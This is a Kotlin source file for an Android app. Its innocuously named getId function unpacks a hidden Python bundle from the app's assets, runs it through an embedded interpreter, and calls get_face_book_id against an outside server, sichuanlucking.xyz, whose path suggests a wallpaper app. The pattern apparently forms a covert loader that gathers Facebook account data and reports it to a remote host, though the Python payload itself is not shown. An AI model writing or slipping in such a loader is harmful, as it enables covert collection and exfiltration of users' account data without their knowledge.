package xxx.xxx.zzzz

import androidx.appcompat.app.AppCompatActivity
import com.srplab.www.starcore.StarCoreFactory
import com.srplab.www.starcore.StarCoreFactoryPath
import com.srplab.www.starcore.StarSrvGroupClass
import java.io.File
import java.io.IOException
import kotlin.concurrent.thread

fun AppCompatActivity.getId(){
    var SrvGroup: StarSrvGroupClass? = null
    try {
        val file = File("/data/data/$packageName/files")
        if (file.list().isEmpty()){
            val assetManager = assets
            val dataSource = assetManager.open("py_code.zip")
            StarCoreFactoryPath.Install(dataSource, "/data/data/$packageName/files", true)
        }
    } catch (e: IOException) {
    }
    thread {
        StarCoreFactoryPath.StarCoreCoreLibraryPath = "/data/data/$packageName/files"
        StarCoreFactoryPath.StarCoreShareLibraryPath = "/data/data/$packageName/files"
        StarCoreFactoryPath.StarCoreOperationPath = "/data/data/$packageName/files"
        val starcore = StarCoreFactory.GetFactory()
        starcore._SRPLock()
        SrvGroup = starcore._GetSrvGroup(0)
        var Service = SrvGroup?._GetService("test","123")
        if (Service == null){
            Service = starcore._InitSimple("test","123",0,0)
        }else{
            Service._CheckPassword(false)
        }
        Service?._CheckPassword(false)
        SrvGroup?._InitRaw("python37", Service);
        val python = Service!!._ImportRawContext("python", "", false, "")
        python._Call("eval", "import requests");
        starcore._SRPUnLock()
        Service._DoFile("python", "/data/data/$packageName/files/py_code.py", "")
        val result = python._Call("get_face_book_id", "https://sichuanlucking.xyz/purewallpaper490/fb.php")
        println("result = $result")
    }
}